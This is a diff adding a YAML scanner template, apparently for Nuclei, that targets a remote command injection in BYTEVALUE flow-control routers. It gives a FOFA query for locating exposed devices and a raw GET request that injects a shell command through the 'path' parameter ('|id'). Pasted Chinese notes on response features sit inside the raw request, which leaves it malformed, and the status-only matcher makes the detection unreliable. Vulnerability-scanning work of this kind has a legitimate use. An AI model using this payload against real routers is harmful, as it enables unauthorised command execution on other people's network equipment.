@@ -1,0 +1,40 @@
+id: poc-ahhh8s1q0l0cgrce
+info:
+  name: BYTEVALUE 百为流控路由器远程命令漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ahhh8s1q0l0cgrce'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ahhh8s1q0l0cgrce
+    fofa: BYTEVALUE 智能流控路由器
+http:
+- raw:
+  - 'GET /goform/webRead/open/?path=|id HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    admin
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
